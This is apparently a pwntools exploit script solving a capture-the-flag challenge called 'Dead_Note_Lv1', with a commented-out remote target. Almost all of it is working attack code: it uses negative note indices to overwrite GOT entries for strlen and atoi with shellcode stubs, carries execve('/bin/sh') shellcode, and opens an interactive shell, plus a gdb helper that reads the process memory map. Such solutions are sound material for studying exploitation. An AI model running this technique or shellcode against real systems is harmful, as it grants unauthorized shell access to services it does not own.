from pwn import * 
sh = process("./Dead_Note_Lv1") 
# sh = remote("bksec.team", 4326)
def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

def debug(bp):
    #bp = [0xea0,0xd31,0xc52]
    #bp = [0x00000dfb,0x00000b7c,0x00000d10]
    script = ""
    PIE = get_PIE(sh)
    PAPA = PIE
    print hex(PIE + 0x202018)       # free 
    print hex(PIE + 0x2020E0)       # node 
    # script += "x/gx 0x%x\n"%(PIE + 0x202018) 
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    
    gdb.attach(sh,gdbscript=script) 

def add(id, count, content) : 
    sh.recv() 
    sh.sendline("1") 
    sh.recv() 
    sh.sendline(str(id)) 
    sh.recv() 
    sh.sendline(str(count)) 
    sh.recv() 
    sh.send(content)         

def add_shell(id, count, content) : 
    sh.recv() 
    sh.sendline("1") 
    sh.recv() 
    sh.sendline(str(id)) 
    sh.recv() 
    sh.sendline(str(count)) 
    sh.recv() 
    jmp = "\xEB" 
    jmp += chr(30 -len(content))   
    sh.send(content + jmp)     

def free(id) : 
    sh.recv() 
    sh.sendline("2") 
    sh.recv() 
    sh.sendline(str(id)) 

debug([0xC3A, 0x629])    #  
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"



add(-23, 1, "\x31\xc0\xc3")      #  overwrite strlen 
# add_shell(0, 1, "\xBA\x2F\x2F\x73\x68")   
add(-14, 1, "\x50\x5A\x50\x5E\x34\x3B\x0F\x05")             # overwrite atoi -> heap  
#for i in range(1, len(shellcode)) :     
#    add(i , 2, shellcode[i])     
#add(0, 1, "aaaaaaaa") 
# free(0)   
print sh.recv() 
sh.send("/bin/sh")


sh.interactive()